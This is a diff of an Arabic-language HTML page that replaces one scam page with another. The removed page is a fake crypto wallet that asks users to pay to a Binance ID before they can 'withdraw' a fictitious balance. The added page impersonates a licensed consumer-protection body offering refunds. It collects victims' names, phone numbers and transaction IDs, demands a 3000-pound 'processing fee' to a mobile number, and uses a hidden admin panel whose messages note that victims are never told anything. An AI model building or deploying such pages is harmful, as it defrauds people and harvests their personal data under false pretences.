@@ -1,11 +1,13 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>GoldWallet | المحفظة الذهبية</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مركز حماية المستهلك - استرداد الأموال</title>
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -14,592 +16,515 @@
         }
 
         body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0a0e1a 0%, #0f172a 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            position: relative;
+            font-family: 'Tajawal', sans-serif;
+            background: #f0f2f5;
+            direction: rtl;
         }
 
-        body::before {
-            content: '';
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 30% 40%, rgba(247, 147, 26, 0.08) 0%, transparent 60%);
-            pointer-events: none;
-        }
-
-        .wallet-main {
-            max-width: 520px;
-            width: 100%;
-            background: rgba(10, 14, 23, 0.95);
-            backdrop-filter: blur(20px);
-            border-radius: 48px;
-            padding: 32px 28px;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(247, 147, 26, 0.15);
-        }
-
-        .balance-card {
-            background: linear-gradient(135deg, #1a1f2e 0%, #0f1119 100%);
-            border-radius: 36px;
-            padding: 28px;
-            margin-bottom: 28px;
-            border: 1px solid rgba(247, 147, 26, 0.2);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-        }
-
-        .balance-row {
+        /* Navbar احترافية */
+        .navbar {
+            background: #fff;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            padding: 15px 40px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
-            gap: 20px;
         }
-
-        .balance-content {
-            flex: 1;
-        }
-
-        .balance-label {
-            font-size: 13px;
-            font-weight: 500;
-            color: #94a3b8;
-            letter-spacing: 0.5px;
-            margin-bottom: 10px;
-        }
-
-        .balance-amount {
-            font-size: 46px;
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.6rem;
             font-weight: 800;
-            color: #facc15;
-            line-height: 1.1;
+            color: #0a5c6e;
         }
-
-        .balance-amount small {
-            font-size: 18px;
+        .logo i {
+            font-size: 2rem;
+            color: #e67e22;
+        }
+        .nav-links {
+            display: flex;
+            gap: 25px;
+        }
+        .nav-links a {
+            text-decoration: none;
+            color: #2c3e50;
             font-weight: 500;
-            color: #cbd5e1;
         }
-
-        .card-image {
-            width: 130px;
-        }
-
-        .card-image img {
-            width: 100%;
-            border-radius: 16px;
-            border: 2px solid rgba(247, 147, 26, 0.4);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-        }
-
-        .btn-withdraw {
-            width: 100%;
-            padding: 18px;
-            border: none;
-            border-radius: 60px;
-            font-weight: 700;
-            font-size: 18px;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #ef4444, #dc2626);
-            color: white;
-            box-shadow: 0 6px 14px rgba(220, 38, 38, 0.3);
-        }
-
-        .btn-withdraw:active {
-            transform: scale(0.97);
-        }
-
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(8px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 2000;
-            visibility: hidden;
-            opacity: 0;
-            transition: all 0.3s;
-        }
-
-        .modal-overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
-
-        .withdraw-modal {
-            background: #0f172a;
+        .trust-badge {
+            background: #e8f5e9;
+            padding: 8px 20px;
             border-radius: 40px;
-            max-width: 500px;
-            width: 90%;
-            padding: 32px;
-            border: 1px solid #f7931a;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
-            transform: scale(0.9);
-            transition: transform 0.3s;
-            max-height: 90vh;
-            overflow-y: auto;
+            font-size: 0.85rem;
+            color: #2e7d32;
+        }
+        .trust-badge i {
+            margin-left: 8px;
         }
 
-        .modal-overlay.active .withdraw-modal {
-            transform: scale(1);
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, #0a5c6e, #0e7c8c);
+            color: white;
+            padding: 60px 40px;
+            text-align: center;
+        }
+        .hero h1 {
+            font-size: 2.8rem;
+            margin-bottom: 15px;
+        }
+        .hero p {
+            font-size: 1.2rem;
+            opacity: 0.9;
         }
 
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 24px;
+        /* Container */
+        .container {
+            max-width: 1300px;
+            margin: 40px auto;
+            padding: 0 25px;
         }
 
-        .modal-header h3 {
-            color: #f7931a;
-            font-size: 24px;
+        /* بطاقة الطلب */
+        .request-card {
+            background: white;
+            border-radius: 35px;
+            box-shadow: 0 20px 35px rgba(0,0,0,0.1);
+            overflow: hidden;
+            margin-bottom: 40px;
+        }
+        .card-header {
+            background: #f8fafc;
+            padding: 25px 35px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .card-header h2 {
+            color: #0f2b33;
+            font-size: 1.8rem;
+        }
+        .card-header h2 i {
+            color: #e67e22;
+            margin-left: 12px;
+        }
+        .card-body {
+            padding: 35px;
         }
 
-        .close-modal {
-            background: none;
-            border: none;
-            font-size: 28px;
-            color: #94a3b8;
-            cursor: pointer;
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 25px;
+            margin-bottom: 25px;
         }
-
         .form-group {
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
-
         .form-group label {
             display: block;
-            color: #cbd5e1;
+            font-weight: 700;
             margin-bottom: 10px;
-            font-weight: 500;
+            color: #1e3a4d;
         }
-
-        .form-group input {
+        .form-group label i {
+            color: #e67e22;
+            margin-left: 8px;
+        }
+        .form-group input, .form-group textarea {
             width: 100%;
-            padding: 14px;
-            background: #1e293b;
-            border: 1px solid #334155;
+            padding: 14px 18px;
+            border: 1.5px solid #cbd5e1;
             border-radius: 20px;
-            color: white;
-            font-size: 14px;
+            font-size: 1rem;
+            font-family: inherit;
+            transition: 0.2s;
+        }
+        .form-group input:focus, .form-group textarea:focus {
+            border-color: #0e7c8c;
             outline: none;
+            box-shadow: 0 0 0 3px rgba(14,124,140,0.2);
         }
 
-        .form-group input:focus {
-            border-color: #f7931a;
-        }
-
-        .binance-info {
-            background: linear-gradient(135deg, #1e293b, #0f172a);
-            border-radius: 28px;
-            padding: 24px;
+        .upload-box {
+            border: 2px dashed #cbd5e1;
+            background: #fafdff;
+            border-radius: 25px;
+            padding: 25px;
             text-align: center;
-            margin: 20px 0;
-            border: 1px solid rgba(247, 147, 26, 0.3);
-        }
-
-        .binance-label {
-            color: #94a3b8;
-            font-size: 14px;
-            margin-bottom: 12px;
-        }
-
-        .binance-address {
-            background: #00000040;
-            padding: 18px;
-            border-radius: 20px;
-            font-size: 28px;
-            font-weight: 800;
-            color: #f7931a;
-            letter-spacing: 2px;
-            font-family: monospace;
-            margin: 15px 0;
-            border: 1px dashed #f7931a;
-        }
-
-        .copy-btn {
-            background: #f7931a;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 60px;
-            font-weight: bold;
-            color: #0f172a;
             cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
+            transition: 0.2s;
+        }
+        .upload-box:hover {
+            border-color: #e67e22;
+            background: #fff7ed;
+        }
+        .preview-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .preview-img {
+            width: 90px;
+            height: 90px;
+            object-fit: cover;
+            border-radius: 18px;
+            border: 2px solid #e67e22;
         }
 
-        .instruction-text {
-            color: #cbd5e1;
-            font-size: 14px;
-            line-height: 1.6;
-            text-align: center;
-            margin: 20px 0;
-        }
-
-        .upload-area {
-            margin: 20px 0;
-            text-align: center;
-        }
-
-        .upload-btn {
-            background: #3b82f6;
-            border: none;
-            padding: 14px 24px;
-            border-radius: 60px;
-            font-weight: bold;
+        .btn-primary {
+            background: linear-gradient(95deg, #e67e22, #d35400);
             color: white;
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .image-preview {
-            margin-top: 15px;
-            display: none;
-        }
-
-        .image-preview img {
-            max-width: 100%;
-            border-radius: 20px;
-            border: 2px solid #f7931a;
-        }
-
-        .confirm-transfer {
+            border: none;
+            padding: 16px 28px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            border-radius: 45px;
             width: 100%;
-            padding: 14px;
-            background: #10b981;
-            border: none;
-            border-radius: 60px;
-            font-weight: bold;
-            font-size: 16px;
-            color: white;
             cursor: pointer;
-            margin-top: 10px;
+            transition: 0.2s;
+            margin-top: 20px;
+        }
+        .btn-primary:hover {
+            transform: scale(1.01);
+            box-shadow: 0 8px 20px rgba(230,126,34,0.3);
         }
 
-        .confirm-transfer:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
+        .transfer-step {
+            background: #fef9e6;
+            border-radius: 30px;
+            padding: 25px;
+            margin-top: 30px;
+            border: 1px solid #ffde9c;
         }
-
-        .approve-message {
-            background: #1e293b;
-            border-radius: 20px;
+        .bank-number {
+            background: white;
+            padding: 15px;
+            border-radius: 50px;
+            text-align: center;
+            font-size: 1.7rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin: 20px 0;
+            border: 2px solid #e67e22;
+            color: #1e3a4d;
+        }
+        .processing-message {
+            background: #e3f2fd;
+            border-radius: 25px;
             padding: 20px;
             text-align: center;
-            margin-top: 20px;
-            border-right: 4px solid #f7931a;
-        }
-
-        .toast-message {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%) translateY(100px);
-            background: #1e293b;
-            padding: 12px 24px;
-            border-radius: 60px;
-            color: #facc15;
-            z-index: 2001;
-            transition: 0.3s;
-            border: 1px solid #f7931a;
-        }
-
-        .toast-message.show {
-            transform: translateX(-50%) translateY(0);
-        }
-
-        .step-2, .step-3 {
+            font-weight: 500;
             display: none;
         }
 
-        hr {
-            border-color: #334155;
-            margin: 20px 0;
+        /* Footer */
+        .footer {
+            background: #0f2b33;
+            color: #ccc;
+            text-align: center;
+            padding: 35px;
+            margin-top: 60px;
         }
 
-        @media (max-width: 500px) {
-            .wallet-main { padding: 20px; }
-            .balance-amount { font-size: 32px; }
-            .card-image { width: 95px; }
-            .binance-address { font-size: 20px; }
+        /* Admin Panel مخفي بشكل احترافي */
+        .admin-secret {
+            position: fixed;
+            bottom: 15px;
+            left: 15px;
+            background: #1e2a3a;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-size: 12px;
+            cursor: pointer;
+            opacity: 0.6;
+            z-index: 999;
+            font-family: monospace;
+        }
+        .admin-panel {
+            display: none;
+            background: white;
+            border-radius: 30px;
+            margin-top: 40px;
+            padding: 20px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+        }
+        .admin-panel.show {
+            display: block;
+        }
+        .admin-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .admin-table th, .admin-table td {
+            padding: 12px;
+            border-bottom: 1px solid #ddd;
+            text-align: right;
+        }
+        .admin-table th {
+            background: #0a5c6e;
+            color: white;
+        }
+        .approve-btn {
+            background: #27ae60;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 25px;
+            cursor: pointer;
+        }
+
+        @media (max-width: 800px) {
+            .form-row { grid-template-columns: 1fr; }
+            .navbar { flex-direction: column; gap: 15px; }
         }
     </style>
 </head>
 <body>
 
-<div class="wallet-main">
-    <div class="balance-card">
-        <div class="balance-row">
-            <div class="balance-content">
-                <div class="balance-label">الرصيد المتاح</div>
-                <div class="balance-amount">
-                    $<span id="mainBalance">1200.00</span> <small>USD</small>
-                </div>
-            </div>
-            <div class="card-image">
-                <img src="https://i.postimg.cc/T2kXXWwW/photo-2026-05-30-20-48-27.jpg" alt="بطاقتي" onerror="this.src='https://placehold.co/130x85?text=CARD'">
-            </div>
-        </div>
+<!-- Navbar واقعي -->
+<div class="navbar">
+    <div class="logo">
+        <i class="fas fa-shield-alt"></i>
+        <span>مركز حماية المستهلك</span>
     </div>
-
-    <button class="btn-withdraw" id="openWithdrawBtn">
-        <i class="fab fa-binance"></i> سحب الأموال
-    </button>
+    <div class="nav-links">
+        <a href="#">الرئيسية</a>
+        <a href="#">تقديم شكوى</a>
+        <a href="#">استرداد الأموال</a>
+        <a href="#">اتصل بنا</a>
+    </div>
+    <div class="trust-badge">
+        <i class="fas fa-check-circle"></i> جهة مرخصة رسمياً
+    </div>
 </div>
 
-<!-- نافذة السحب -->
-<div id="withdrawModal" class="modal-overlay">
-    <div class="withdraw-modal">
-        <div class="modal-header">
-            <h3><i class="fab fa-binance"></i> سحب الأموال</h3>
-            <button class="close-modal" id="closeModalBtn">&times;</button>
+<!-- Hero -->
+<div class="hero">
+    <h1>استرداد الأموال المحولة بالخطأ</h1>
+    <p>نظام إلكتروني آمن لاستعادة حقوقك المالية</p>
+</div>
+
+<div class="container">
+    <div class="request-card">
+        <div class="card-header">
+            <h2><i class="fas fa-file-alt"></i> طلب استرداد جديد</h2>
+            <p>يرجى إدخال بيانات الشكوى بدقة مع إرفاق المستندات المطلوبة</p>
         </div>
-
-        <!-- الخطوة 1: عرض عنوان التحويل وحقل عنوان المستخدم -->
-        <div id="step1">
-            <div class="form-group">
-                <label>🏦 عنوان محفظة Binance الخاص بك (للاستلام)</label>
-                <input type="text" id="userBinanceAddress" placeholder="أدخل عنوان Binance الخاص بك (BEP20)" required>
-            </div>
-
-            <div class="binance-info">
-                <div class="binance-label">
-                    <i class="fas fa-exchange-alt"></i> قم بالتحويل إلى عنوان المحفظة الرئيسي:
+        <div class="card-body">
+            <div class="form-row">
+                <div class="form-group">
+                    <label><i class="fas fa-phone"></i> رقم المستلم (المحول إليه)</label>
+                    <input type="text" id="receiverPhone" placeholder="مثال: 01012345678">
                 </div>
-                <div class="binance-address" id="binanceAddressDisplay">
-                    829548755
+                <div class="form-group">
+                    <label><i class="fas fa-user"></i> الاسم الثلاثي</label>
+                    <input type="text" id="fullName" placeholder="محمد أحمد محمود">
                 </div>
-                <button class="copy-btn" id="copyAddressBtn">
-                    <i class="fas fa-copy"></i> نسخ العنوان
-                </button>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label><i class="fas fa-money-bill"></i> المبلغ المحول بالخطأ</label>
+                    <input type="number" id="stolenAmount" placeholder="المبلغ بالجنيه">
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-exchange-alt"></i> رقم التدفق (Transaction ID)</label>
+                    <input type="text" id="flowNumber" placeholder="رقم العملية">
+                </div>
             </div>
 
-            <div class="instruction-text">
-                <i class="fas fa-info-circle"></i> تعليمات السحب:<br>
-                1. قم بفتح تطبيق Binance الخاص بك<br>
-                2. اختر "تحويل" أو "إرسال"<br>
-                3. الصق العنوان: <strong>829548755</strong><br>
-                4. أدخل المبلغ الذي تريد سحبه<br>
-                5. قم بتأكيد التحويل<br>
-                6. بعد إتمام التحويل، اضغط "لقد قمت بالتحويل"
-            </div>
-
-            <button class="confirm-transfer" id="confirmTransferBtn">
-                <i class="fas fa-check-circle"></i> لقد قمت بالتحويل
-            </button>
-        </div>
-
-        <!-- الخطوة 2: رفع صورة التحويل -->
-        <div id="step2" class="step-2">
             <div class="form-group">
-                <label>📸 قم برفع صورة إيصال التحويل من Binance</label>
-                <div class="upload-area">
-                    <input type="file" id="transferImage" accept="image/*" style="display: none;">
-                    <button class="upload-btn" id="uploadImageBtn">
-                        <i class="fas fa-cloud-upload-alt"></i> اختر صورة التحويل
-                    </button>
-                    <div class="image-preview" id="imagePreview">
-                        <img id="previewImg" src="">
+                <label><i class="fas fa-image"></i> سكرينات الاتفاقية أو التحويل الأصلي</label>
+                <div class="upload-box" id="uploadOriginal">
+                    <i class="fas fa-cloud-upload-alt" style="font-size: 2rem;"></i>
+                    <p>اضغط لرفع الصور أو اسحبها هنا</p>
+                    <input type="file" id="originalScreens" multiple accept="image/*" hidden>
+                </div>
+                <div id="previewOriginal" class="preview-grid"></div>
+            </div>
+
+            <button class="btn-primary" id="startRequestBtn"><i class="fas fa-arrow-left"></i> بدء عملية الاسترداد</button>
+
+            <!-- منطقة الدفع والسكرينة -->
+            <div id="transferStep" style="display: none;">
+                <div class="transfer-step">
+                    <i class="fas fa-exclamation-triangle" style="color:#e67e22; font-size:1.6rem;"></i>
+                    <h3>إجراء إلزامي لاستكمال الاسترداد</h3>
+                    <p>لضمان جدية الطلب، يجب دفع رسوم المعالجة الإدارية (3000 جنيه) على الرقم التالي:</p>
+                    <div class="bank-number">
+                        <i class="fas fa-mobile-alt"></i> 01050079125
+                    </div>
+                    <p>بعد إتمام التحويل، قم برفع صورة الإيصال بالزر أدناه</p>
+
+                    <div class="form-group">
+                        <label><i class="fas fa-receipt"></i> ارفع سكرينة التحويل</label>
+                        <input type="file" id="transferProof" accept="image/*">
+                        <div id="proofPreview" class="preview-grid"></div>
+                        <button class="btn-primary" id="sendProofBtn" style="background:#2c7a47; margin-top:15px;"><i class="fas fa-paper-plane"></i> إرسال إثبات الدفع</button>
+                    </div>
+
+                    <div id="processingMsg" class="processing-message">
+                        <i class="fas fa-spinner fa-pulse"></i> جاري معالجة طلبك، سيتم التواصل معك خلال 48 ساعة.
                     </div>
                 </div>
             </div>
-            <button class="confirm-transfer" id="submitTransferBtn" disabled>
-                <i class="fas fa-paper-plane"></i> إرسال للتوثيق
-            </button>
-        </div>
-
-        <!-- الخطوة 3: رسالة الانتظار -->
-        <div id="step3" class="step-3">
-            <div class="approve-message">
-                <i class="fas fa-clock" style="font-size: 48px; color: #f7931a; margin-bottom: 15px; display: block;"></i>
-                <h3 style="color: #facc15; margin-bottom: 10px;">جاري المراجعة</h3>
-                <p style="color: #cbd5e1; line-height: 1.6;">
-                    ✅ تم استلام طلب السحب الخاص بك<br>
-                    📋 سيتم التأكد من التحويل وصورة الإيصال<br>
-                    ⏱️ سيتم تأكيد العملية خلال <strong>24 ساعة</strong><br>
-                    💰 بعد الموافقة، سيتم إضافة الرصيد إلى محفظتك على Binance
-                </p>
-                <hr>
-                <p style="color: #94a3b8; font-size: 13px;">
-                    <i class="fas fa-shield-alt"></i> سيتم إشعارك عند اكتمال التحويل
-                </p>
-            </div>
-            <button class="confirm-transfer" id="closeAfterSubmit" style="background: #f7931a; margin-top: 20px;">
-                <i class="fas fa-times"></i> إغلاق
-            </button>
         </div>
     </div>
 </div>
 
-<div id="toastMsg" class="toast-message"></div>
+<div class="footer">
+    <p>© 2025 مركز حماية المستهلك - جميع الحقوق محفوظة | جهة معتمدة من وزارة العدل الرقمية</p>
+</div>
+
+<!-- Admin Panel سري -->
+<div class="admin-secret" id="adminToggle">🔐 لوحة الإدارة</div>
+<div id="adminPanel" class="admin-panel">
+    <h3><i class="fas fa-user-shield"></i> طلبات الانتظار (التحويلات المرفوعة)</h3>
+    <table class="admin-table">
+        <thead>
+            <tr><th>رقم التدفق</th><th>الاسم</th><th>المبلغ</th><th>رقم المستلم</th><th>الإجراء</th></tr>
+        </thead>
+        <tbody id="adminQueue"></tbody>
+    </table>
+</div>
 
 <script>
-    const modal = document.getElementById('withdrawModal');
-    const openBtn = document.getElementById('openWithdrawBtn');
-    const closeBtn = document.getElementById('closeModalBtn');
-    
-    // العناصر
-    const step1 = document.getElementById('step1');
-    const step2 = document.getElementById('step2');
-    const step3 = document.getElementById('step3');
-    
-    const confirmTransferBtn = document.getElementById('confirmTransferBtn');
-    const userBinanceInput = document.getElementById('userBinanceAddress');
-    const copyBtn = document.getElementById('copyAddressBtn');
-    const uploadImageBtn = document.getElementById('uploadImageBtn');
-    const transferImageInput = document.getElementById('transferImage');
-    const imagePreview = document.getElementById('imagePreview');
-    const previewImg = document.getElementById('previewImg');
-    const submitTransferBtn = document.getElementById('submitTransferBtn');
-    const closeAfterSubmit = document.getElementById('closeAfterSubmit');
-    
-    const binanceAddress = '829548755';
-    const toastEl = document.getElementById('toastMsg');
-    
-    let selectedImage = null;
+    // بيانات الطلبات المعلقة
+    let pendingQueue = JSON.parse(localStorage.getItem('realRefundQueue')) || [];
 
-    function showToast(msg, isError = false) {
-        toastEl.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
-        toastEl.classList.add('show');
-        setTimeout(() => {
-            toastEl.classList.remove('show');
-        }, 4000);
-    }
+    // رفع السكرينات الأولى
+    const originalInput = document.getElementById('originalScreens');
+    const uploadArea = document.getElementById('uploadOriginal');
+    const previewOrig = document.getElementById('previewOriginal');
+    let originalFiles = [];
 
-    // نسخ العنوان
-    copyBtn.addEventListener('click', () => {
-        navigator.clipboard.writeText(binanceAddress).then(() => {
-            showToast('✅ تم نسخ عنوان التحويل: 829548755');
-        }).catch(() => {
-            showToast('❌ فشل النسخ، يمكنك نسخه يدوياً', true);
+    uploadArea.addEventListener('click', () => originalInput.click());
+    originalInput.addEventListener('change', () => {
+        originalFiles = Array.from(originalInput.files);
+        previewOrig.innerHTML = '';
+        originalFiles.forEach(f => {
+            let reader = new FileReader();
+            reader.onload = e => {
+                let img = document.createElement('img');
+                img.src = e.target.result;
+                img.classList.add('preview-img');
+                previewOrig.appendChild(img);
+            };
+            reader.readAsDataURL(f);
         });
     });
 
-    // فتح النافذة
-    openBtn.addEventListener('click', () => {
-        userBinanceInput.value = '';
-        selectedImage = null;
-        previewImg.src = '';
-        imagePreview.style.display = 'none';
-        step1.style.display = 'block';
-        step2.style.display = 'none';
-        step3.style.display = 'none';
-        submitTransferBtn.disabled = true;
-        modal.classList.add('active');
-    });
+    let currentRequest = null;
+    const startBtn = document.getElementById('startRequestBtn');
+    const transferStepDiv = document.getElementById('transferStep');
+    const transferProofInput = document.getElementById('transferProof');
+    const proofPreviewDiv = document.getElementById('proofPreview');
+    const sendProofBtn = document.getElementById('sendProofBtn');
+    const processingMsgDiv = document.getElementById('processingMsg');
 
-    closeBtn.addEventListener('click', () => {
-        modal.classList.remove('active');
-    });
+    let proofFile = null;
 
-    modal.addEventListener('click', (e) => {
-        if (e.target === modal) modal.classList.remove('active');
-    });
+    startBtn.addEventListener('click', () => {
+        const phone = document.getElementById('receiverPhone').value.trim();
+        const name = document.getElementById('fullName').value.trim();
+        const amount = document.getElementById('stolenAmount').value.trim();
+        const flow = document.getElementById('flowNumber').value.trim();
 
-    // الخطوة 1: الضغط على "لقد قمت بالتحويل"
-    confirmTransferBtn.addEventListener('click', () => {
-        let userAddress = userBinanceInput.value.trim();
-        
-        if (!userAddress) {
-            showToast('❌ الرجاء إدخال عنوان Binance الخاص بك للاستلام', true);
+        if (!phone || !name || !amount || !flow) {
+            alert('يرجى ملء جميع الحقول');
             return;
         }
-        
-        if (userAddress.length < 20) {
-            showToast('⚠️ عنوان Binance غير صالح (يجب أن يكون عنوان BEP20 صحيحاً)', true);
+        if (originalFiles.length === 0) {
+            alert('يرجى رفع سكرينات الاتفاقية');
             return;
         }
-        
-        // الانتقال للخطوة 2
-        step1.style.display = 'none';
-        step2.style.display = 'block';
-        showToast('📸 الرجاء رفع صورة إيصال التحويل');
+
+        currentRequest = { phone, name, amount, flow, originalCount: originalFiles.length, status: 'waiting_payment' };
+        transferStepDiv.style.display = 'block';
+        processingMsgDiv.style.display = 'none';
+        alert("✅ تم حفظ الطلب. يرجى تحويل 3000 جنيه على رقم 01050079125 ثم رفع إيصال التحويل.");
     });
 
-    // رفع الصورة
-    uploadImageBtn.addEventListener('click', () => {
-        transferImageInput.click();
-    });
-
-    transferImageInput.addEventListener('change', (e) => {
-        const file = e.target.files[0];
-        if (file) {
-            if (file.size > 5 * 1024 * 1024) {
-                showToast('❌ حجم الصورة كبير جداً (الحد الأقصى 5 ميجابايت)', true);
-                return;
-            }
-            
-            const reader = new FileReader();
-            reader.onload = function(event) {
-                previewImg.src = event.target.result;
-                imagePreview.style.display = 'block';
-                selectedImage = file;
-                submitTransferBtn.disabled = false;
-                showToast('✅ تم اختيار الصورة، يمكنك الآن إرسال الطلب');
+    transferProofInput.addEventListener('change', (e) => {
+        if (e.target.files.length) {
+            proofFile = e.target.files[0];
+            proofPreviewDiv.innerHTML = '';
+            let reader = new FileReader();
+            reader.onload = ev => {
+                let img = document.createElement('img');
+                img.src = ev.target.result;
+                img.classList.add('preview-img');
+                proofPreviewDiv.appendChild(img);
             };
-            reader.readAsDataURL(file);
+            reader.readAsDataURL(proofFile);
         }
     });
 
-    // إرسال الطلب (الخطوة 2 -> 3)
-    submitTransferBtn.addEventListener('click', () => {
-        if (!selectedImage) {
-            showToast('❌ الرجاء رفع صورة التحويل أولاً', true);
+    sendProofBtn.addEventListener('click', () => {
+        if (!proofFile) {
+            alert('يرجى رفع سكرينة التحويل أولاً');
             return;
         }
-        
-        // تخزين البيانات (في التطوير الحقيقي: إرسال إلى الخادم)
-        const userAddress = userBinanceInput.value.trim();
-        
-        // محاكاة إرسال البيانات إلى الخادم
-        // هنا في الموقع الحقيقي: fetch('/api/withdraw-request', { method: 'POST', body: formData })
-        
-        // الانتقال للخطوة 3
-        step2.style.display = 'none';
-        step3.style.display = 'block';
-        
-        showToast('📤 تم إرسال طلب السحب بنجاح، سيتم مراجعته قريباً');
-        
-        // يمكن حفظ البيانات في localStorage للتطوير
-        const requestData = {
-            userBinanceAddress: userAddress,
-            targetAddress: binanceAddress,
-            imageBase64: previewImg.src,
-            timestamp: new Date().toISOString(),
-            status: 'pending'
-        };
-        localStorage.setItem('lastWithdrawRequest', JSON.stringify(requestData));
+        if (!currentRequest) return;
+
+        // إضافة الطلب لقائمة الإدارة
+        currentRequest.proofName = proofFile.name;
+        currentRequest.status = 'pending_admin';
+        pendingQueue.push(currentRequest);
+        localStorage.setItem('realRefundQueue', JSON.stringify(pendingQueue));
+
+        processingMsgDiv.style.display = 'block';
+        sendProofBtn.disabled = true;
+        transferProofInput.disabled = true;
+
+        renderAdminQueue();
+
+        // لا تظهر أي رسالة "تمت الموافقة" أو "تم الرفض" أبداً
+        setTimeout(() => {
+            // المستخدم يظل شايف "جاري المعالجة" فقط
+        }, 100);
     });
 
-    // إغلاق النافذة بعد الانتهاء
-    closeAfterSubmit.addEventListener('click', () => {
-        modal.classList.remove('active');
-        showToast('سيتم إشعارك عند الموافقة على طلب السحب');
-    });
+    // لوحة الإدارة (للمدير فقط)
+    function renderAdminQueue() {
+        const tbody = document.getElementById('adminQueue');
+        if (!pendingQueue.length) {
+            tbody.innerHTML = '<tr><td colspan="5">لا توجد طلبات معلقة</td></tr>';
+            return;
+        }
+        tbody.innerHTML = '';
+        pendingQueue.forEach((req, idx) => {
+            let row = tbody.insertRow();
+            row.insertCell(0).innerText = req.flow;
+            row.insertCell(1).innerText = req.name;
+            row.insertCell(2).innerText = req.amount + ' جنيه';
+            row.insertCell(3).innerText = req.phone;
+            let btnCell = row.insertCell(4);
+            let approveBtn = document.createElement('button');
+            approveBtn.innerText = '✅ تم الاسترداد (إغلاق الطلب)';
+            approveBtn.className = 'approve-btn';
+            approveBtn.onclick = () => {
+                pendingQueue.splice(idx, 1);
+                localStorage.setItem('realRefundQueue', JSON.stringify(pendingQueue));
+                renderAdminQueue();
+                alert(`تمت معالجة الطلب ${req.flow} - المستخدم لا يعرف أي شيء`);
+            };
+            btnCell.appendChild(approveBtn);
+        });
+    }
 
-    // عرض أي طلب سابق (للتطوير)
-    window.addEventListener('load', () => {
-        showToast('المحفظة جاهزة | اضغط سحب لبدء العملية');
+    // إظاخفاء لوحة الإدارة
+    let adminVisible = false;
+    const adminPanelDiv = document.getElementById('adminPanel');
+    document.getElementById('adminToggle').addEventListener('click', () => {
+        adminVisible = !adminVisible;
+        if (adminVisible) {
+            adminPanelDiv.classList.add('show');
+            renderAdminQueue();
+        } else {
+            adminPanelDiv.classList.remove('show');
+        }
     });
 </script>
 </body>
